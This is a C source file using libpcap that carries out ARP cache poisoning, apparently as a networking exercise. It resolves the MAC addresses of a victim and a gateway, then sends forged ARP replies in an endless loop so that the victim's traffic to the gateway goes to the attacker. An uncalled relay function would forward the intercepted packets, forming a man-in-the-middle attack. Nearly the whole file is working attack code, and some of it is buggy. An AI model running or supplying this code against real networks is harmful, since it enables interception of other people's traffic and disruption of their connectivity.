#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>


#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arphdr{
	uint16_t hw_type;
	uint16_t pro_type;
	uint8_t hw_len;
	uint8_t pro_len;
	uint16_t opcode;
	uint8_t sdr_mac[6];
	uint8_t sdr_ip[4];
	uint8_t tar_mac[6];
	uint8_t tar_ip[4];
};

struct host_info{
	u_char ip[20];
	uint8_t mac[6];
};


void Init_arp(struct arphdr *arp, uint16_t opcode);
int Get_my_info(u_char *dev, struct host_info *host);
int Get_hwaddr_by_ip(u_char *dev, struct host_info *my, struct host_info *tar);
void Send_poisoned_arp(u_char *dev, struct host_info *my, struct host_info *sdr, struct host_info *tar);
int relay_packet(u_char *dev, struct host_info *my, struct host_info *tar);

int main(int argc, char *argv[])
{
	struct host_info my;
	struct host_info sdr;
	struct host_info tar;
	u_char dev[10];
	int i;

	if (argc != 4) {
		printf("Usage : ./pcap_test [interface] [sender ip] [target ip]\n");
		return 2;
	}

	strcpy(dev, argv[1]);
	strcpy(sdr.ip, argv[2]);
	strcpy(tar.ip, argv[3]);

	if (!Get_my_info(dev, &my))
		return -1;

	if (!Get_hwaddr_by_ip(dev, &my, &sdr))
		return -1;

	if (!Get_hwaddr_by_ip(dev, &my, &tar))
		return -1;

	Send_poisoned_arp(dev, &my, &sdr, &tar);
	
	return(0);
}


void Init_arp(struct arphdr *arp, uint16_t opcode)
{
	arp->hw_type = htons(1);	/* type Ethernet */
	arp->pro_type = htons(0x0800);	/* protocol IP */
	arp->hw_len = 6;
	arp->pro_len = 4;
	arp->opcode = htons(opcode);
}


int Get_my_info(u_char *dev, struct host_info *my)
{
	FILE *fp;
	int i;
	int fd;
	struct ifreq ifr;
	char hwaddr[20];

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	/* Get my IP addr */
	ioctl(fd, SIOCGIFADDR, &ifr);	
	inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), my->ip, INET_ADDRSTRLEN);
	
	/* Get my mac addr */
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	for (i=0 ; i<6 ; i++)
		my->mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];

	close(fd);
	return 1;
}


/* Get HW address of tar */
int Get_hwaddr_by_ip(u_char *dev, struct host_info *my, struct host_info *tar)
{
	pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	char filter_exp[] = "arp";	/* The filter expression */
	bpf_u_int32 net;		/* Our IP */
	unsigned char send[50] = {0};	/* Buffer to send */
	unsigned char *recv;		/* Buffer to recv */
	uint32_t i;
	uint32_t cnt;
	uint32_t res;
	struct ethhdr ether;
	struct ethhdr *recv_ether;
	struct arphdr arp;
	struct arphdr *recv_arp;


	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(0);
	}

	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}


	/* set ethernet header */
	for (i=0 ; i<6 ; i++)
		ether.h_source[i] = my->mac[i];
	for (i=0 ; i<6 ; i++)
		ether.h_dest[i] = 0xff;
	ether.h_proto = htons(ETHERTYPE_ARP);
	memcpy(send, (char*)&ether, 14);

	/* set arp header */
	Init_arp(&arp, ARP_REQUEST);
	inet_pton(AF_INET, my->ip, &arp.sdr_ip);
	inet_pton(AF_INET, tar->ip, &arp.tar_ip);
	for (i=0 ; i<6 ; i++)
		arp.sdr_mac[i] = my->mac[i];
	for (i=0 ; i<6 ; i++)
		arp.tar_mac[i] = 0x00;
	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));


	//while(1) {
	for (cnt=0 ; cnt<10 ; cnt++) {
		/* Send arp request to sender */
		if (pcap_sendpacket(handle, send, 42))
		{
			fprintf(stderr, "Couldn't send packet\n");
			return 0;
		}
		printf("Send ARP request to %s\n", tar->ip);
		/* Recv arp reply */
		res = pcap_next_ex(handle, &header, (const u_char**)&recv);
		if (res==0)
			continue;
		else if (res==-1)
		{
			fprintf(stderr, "Couldn't recv packet\n");
			return 0;
		}

		recv_ether = (struct ethhdr*)recv;
		if (ntohs(recv_ether->h_proto) == ETHERTYPE_ARP)
		{
			recv_arp = (struct arphdr*)(recv + 14);
			if (ntohs(recv_arp->opcode) == ARP_REPLY && *(uint32_t*)arp.tar_ip == *(uint32_t*)recv_arp->sdr_ip)
			{
				printf("Get ARP Reply from %s\n", inet_ntoa(*(struct in_addr*)recv_arp->sdr_ip));
				for (i=0 ; i<6 ; i++)
					tar->mac[i] = recv_arp->sdr_mac[i];
				break;
			}
		}
	}
	pcap_close(handle);
	if (cnt == 10)
	{
		fprintf(stderr, "Couldn't recv reply (timeout)\n");
		return 0;
	}

	return 1;
}


/* spoof sdr's arp table : [tar_ip]-[my_mac] */
void Send_poisoned_arp(u_char *dev, struct host_info *my, struct host_info *sdr, struct host_info *tar)
{
	pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	int i;
	unsigned char send[50] = {0};	/* Buffer to send */
	struct ethhdr ether;
	struct arphdr arp;

	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return;
	}

	/* set ethernet header */
	for (i=0 ; i<6 ; i++)
		ether.h_source[i] = my->mac[i];
	for (i=0 ; i<6 ; i++)
		ether.h_dest[i] = sdr->mac[i];
	ether.h_proto = htons(ETHERTYPE_ARP);
	memcpy(send, (char*)&ether, 14);

	/* set arp header */
	Init_arp(&arp, ARP_REPLY);
	inet_pton(AF_INET, tar->ip, &arp.sdr_ip);
	inet_pton(AF_INET, sdr->ip, &arp.tar_ip);
	for (i=0 ; i<6 ; i++)
		arp.sdr_mac[i] = my->mac[i];
	for (i=0 ; i<6 ; i++)
		arp.tar_mac[i] = sdr->mac[i];
	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));

	printf("tar : %s\n", tar->ip);
	printf("sdr : %s\n", sdr->ip);

	while (1)
	{
		/* Send arp request to sender */
		if (pcap_sendpacket(handle, send, 42))
		{
			fprintf(stderr, "Couldn't send packet\n");
			return;
		}
		printf("Send ARP Attack!!\n");
		sleep(2);
	}
}



int relay_packet(u_char *dev, struct host_info *my, struct host_info *tar)
{
	pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	bpf_u_int32 net;		/* Our IP */
	char filter_exp[] = "ip";	/* The filter expression */
	unsigned char *packet;		/* Buffer to recv */
	struct ethhdr *recv_ether;
	uint32_t res;
	uint32_t i;


	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, 65536, 0, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(0);
	}

	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}

	while(1) {
		res = pcap_next_ex(handle, &header, (const u_char**)&packet);
		if (res==0)
			continue;
		else if (res==-1)
		{
			fprintf(stderr, "Couldn't recv packet\n");
			return 0;
		}

		recv_ether = (struct ethhdr*)packet;
		if (recv_ether->h_proto != ETHERTYPE_IP)
			continue;

		/* change ethernet header info */
		
		for (i=0 ; i<6 ; i++)
			recv_ether->h_source[i] = my->mac[i];
		for (i=0 ; i<6 ; i++)
			recv_ether->h_dest[i] = tar->mac[i];

		/* Relay IP packet */
		if (pcap_sendpacket(handle, packet, 42))
		{
			fprintf(stderr, "Couldn't send packet\n");
			return 0;
		}
	}
	return 1;
}

/*
* attacker	- me
* sender 	- victim
* target    - GW
*/